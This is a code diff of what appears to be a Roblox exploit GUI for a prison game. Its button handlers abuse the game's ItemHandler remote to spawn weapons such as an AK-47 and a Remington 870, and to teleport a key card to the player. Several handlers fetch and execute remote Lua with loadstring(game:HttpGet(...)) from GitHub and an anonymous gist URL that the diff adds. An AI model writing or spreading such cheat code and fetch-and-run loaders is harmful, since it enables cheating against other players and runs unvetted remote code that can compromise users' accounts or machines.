@@ -137,7 +137,7 @@ local function XQEEWAC_fake_script() -- Remington.Script
 	function Click(mouse)
 	
 		local args = {
-			[1] = workspace.Prison_ITEMS.single:FindFirstChild("Remington 870").ITEMPICKUP
+			[1] = workspace.Prison_ITEMS.giver:FindFirstChild("Remington 870").ITEMPICKUP
 		}
 	
 		workspace.Remote.ItemHandler:InvokeServer(unpack(args))
@@ -171,7 +171,7 @@ local function INTBD_fake_script() -- AK.Script
 	function Click(mouse)
 	
 		local args = {
-			[1] = workspace.Prison_ITEMS.single:FindFirstChild("AK-47").ITEMPICKUP
+			[1] = workspace.Prison_ITEMS.giver:FindFirstChild("AK-47").ITEMPICKUP
 		}
 	
 		workspace.Remote.ItemHandler:InvokeServer(unpack(args))
@@ -187,7 +187,7 @@ local function EADD_fake_script() -- Nullware.Script
 
 	function Click(mouse)
 		
-		loadstring(game:HttpGet(('https://raw.githubusercontent.com/xyahsvr/poop/main/baan'),true))()
+		loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/dabc2500988785fbec1ce7c7aaee105d/raw/hVQJXfF4sR6yqSfJ"))()
 		
 	end
 	
@@ -200,11 +200,14 @@ local function FLUP_fake_script() -- Keycard.Script
 
 	function Click(mouse)
 		
-		local args = {
-			[1] = workspace.Prison_ITEMS.single:FindFirstChild("Key card").ITEMPICKUP
-		}
-	
-		workspace.Remote.ItemHandler:InvokeServer(unpack(args))
+		local weapons = {"Key card"}
+		for i, v in pairs(game.Workspace["Prison_ITEMS"].single:GetChildren()) do
+			for j, k in pairs(weapons) do
+				if v.Name == k then
+					v:MoveTo(game.Players.LocalPlayer.Character.Torso.Position)
+				end
+			end
+		end
 	
 	end
 	
@@ -227,8 +230,6 @@ end
 coroutine.wrap(INKJ_fake_script)()
 local function BZBUAUJ_fake_script() -- Reviz.function Click(mouse)
 
---What U want :D
-
 end
 
 
@@ -237,10 +238,10 @@ script.Parent.MouseButton1Down:connect(Click)
 
 	function Click(mouse)
 		
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
-		
-	end
-	
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
+
+    end
+
 	
 	script.Parent.MouseButton1Down:connect(Click)
 coroutine.wrap(BZBUAUJ_fake_script)()
@@ -249,7 +250,7 @@ local function PRCLAVH_fake_script() -- InfiniteYield.Script
 
 	function Click(mouse)
 	
-		loadstring(game:HttpGet(('https://raw.githubusercontent.com/xyahsvr/poop/main/sus'),true))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/xyahsvr/poop/main/sus", true))()
 	
 	end
 	
